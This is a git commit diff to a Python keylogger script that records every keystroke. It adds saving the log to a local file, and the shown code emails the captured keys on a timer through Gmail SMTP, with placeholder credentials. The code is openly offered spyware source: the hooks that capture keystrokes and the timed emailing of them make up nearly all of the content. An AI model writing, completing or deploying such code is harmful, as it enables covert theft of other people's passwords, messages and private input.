45612cf93e0de29e062df364f0a0047f491686c1
avinashkranjan <ranjan.avinash@hotmail.com>
2020-08-16 13:37:18 +0530

    Keylogger

--- Keylogger/keylogger.py
+++ Keylogger/keylogger.py
@@ -1,11 +1,10 @@
 import keyboard  # for keylogs
 import smtplib  # for sending email using SMTP protocol (gmail)
-# Semaphore is for blocking the current thread
-# Timer is to make a method runs after an `interval` amount of time
+# Semaphore is for blocking the current thread # Timer is to make a method runs after an `interval` amount of time
 from threading import Semaphore, Timer
 
-SEND_REPORT_EVERY = 600  # 10 minutes
-EMAIL_ADDRESS = "Your_Email_goes_Here"
+SEND_REPORT_EVERY = 900  # 15 minutes
+EMAIL_ADDRESS = "Your_Email_Goes_Here"
 EMAIL_PASSWORD = "Your_Password_Goes_Here"
 
 
@@ -20,10 +19,7 @@ class Keylogger:
         self.semaphore = Semaphore(0)
 
     def callback(self, event):
-        """
-        This callback is invoked whenever a keyboard event is occured
-        (i.e when a key is released in this example)
-        """
+        # This callback is invoked whenever a keyboard event(Key Press) is occured
         name = event.name
         if len(name) > 1:
             # not a character, special key (e.g ctrl, alt, etc.)
@@ -42,11 +38,15 @@ class Keylogger:
                 name = f"[{name.upper()}]"
 
         self.log += name
+        # Write the key logs to a file
+        # Comment next two lines if you don't want to log in a file and want just a email to be sent.
+        output = open("output.txt", "w+")
+        output.write(self.log)
 
     def sendmail(self, email, password, message):
         # manages a connection to an SMTP server
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
-        # connect to the SMTP server as TLS mode ( for security )
+        # connect to the SMTP server as TLS mode
         server.starttls()
         # login to the email account
         server.login(email, password)
@@ -63,7 +63,7 @@ class Keylogger:
         if self.log:
             # if there is something in log, report it
             self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            # can print to a file, whatever you want
+            # print to the Terminal
             # print(self.log)
         self.log = ""
         Timer(interval=self.interval, function=self.report).start()
